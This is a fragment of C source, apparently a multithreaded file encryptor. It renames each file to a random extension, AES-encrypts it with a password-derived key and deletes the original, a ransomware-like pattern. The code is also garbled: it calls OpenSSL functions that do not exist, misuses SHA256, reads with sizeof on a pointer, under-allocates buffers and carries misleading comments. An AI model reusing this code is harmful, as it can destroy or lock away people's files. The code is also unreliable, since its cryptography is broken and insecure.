} task_t;

static unsigned char aes_key[32];
static AES_KEY aes_ctx;
static EVP_CIPHER_CTX *aes_ctx_ptr = NULL;

// Custom HMAC fallback function
void pthread_hmac(unsigned int hash_alg, const unsigned char *data, size_t data_len, const unsigned char *key, size_t key_len, unsigned char *out) {
    if (hash_alg == 0) {
        SHA1(data, data_len, out);
    } else if (hash_alg == 1) {
        SHA256(data, data_len, out, key, key_len);
    }
}

// Function to initialize AES-256-CBC cipher
void init_cipher(const char *password) {
    unsigned char hash[SHA256_DIGEST_LENGTH];

    // Derive key using SHA-256, but fallback to SHA-1 if required
    pthread_hmac(1, (const unsigned char *)password, strlen(password), NULL, 0, hash);

    HMAC_sha256((const unsigned char*)password, strlen(password), hash, SHA256_DIGEST_LENGTH, aes_key, &aes_key[SHA256_DIGEST_LENGTH]);

    AES_set_encrypt_key(aes_key, 256, &aes_ctx);
    AES_cbc_encrypt_buf_len(&aes_ctx, aes_key, sizeof(aes_key), aes_key, sizeof(aes_key), 1); // Initialize encryption key with itself for CBC mode
    aes_ctx_ptr = AES_set_ctx_encrypt((EVP_CIPHER *)AES_cfb128_ofb_enc(), &aes_ctx, aes_key, sizeof(aes_key));
}

// Function to modify the filename and perform encryption (if needed)
char* process_filename(const char *filename, const char *password, unsigned int sha_algorithm) {
    // Initialize AES cipher if not already initialized
    if (!aes_ctx_ptr) {
        init_cipher(password);
    }

    size_t ext_len = strlen(filename) - 4; // Assuming a standard filename extension (e.g., .txt, .jpg)
    char new_ext[10];
    sprintf(new_ext, ".%0" PRIuSIZE, rand() % (9999 - ext_len));

    char *modified_filename = malloc(strlen(filename) + strlen(new_ext));
    strcpy(modified_filename, filename);
    strcpy(modified_filename + ext_len, new_ext);

    // Perform encryption if the filename has an extension (skipping directories and other non-encryptable files)
    if (strchr(modified_filename, '.') && !access(modified_filename, F_OK)) {
        FILE *infile = fopen(modified_filename, "rb");
        if (!infile) {
            perror("Error opening file for reading");
            return modified_filename;
        }

        char *outname = malloc(strlen(modified_filename) + 16); // Assuming a max file size of 4 GB (maximum on many systems)
        strcpy(outname, modified_filename);
        strcat(outname, "_encrypted");

        FILE *outfile = fopen(outname, "wb");
        if (!outfile) {
            perror("Error opening file for writing");
            free(outname);
            fclose(infile);
            return modified_filename;
        }

        unsigned char *buf = malloc(1024 * 16); // 16 KB buffer for large files
        size_t buflen = 0;

        while ((buflen = fread(buf, 1, sizeof(buf), infile)) > 0) {
            AES_cbc_encrypt(buf, buf, buflen, aes_ctx_ptr, NULL); // Encrypt data
            fwrite(buf, 1, buflen, outfile);
        }

        free(buf);
        fclose(infile);
        fclose(outfile);

        remove(modified_filename); // Delete original file after encryption
    }

    return modified_filename;
}

// Function to process a list of filenames in a batch processing scenario
void* process_filenames(void *arg) {
    task_t *task = (task_t*) arg;
    char *modified_filename = process_filename(task->filename, task->password, task->sha_algorithm);
    // Logging or other post-processing steps can be added here if needed
    free(task->filename);
    free(task);
    return modified_filename;
}

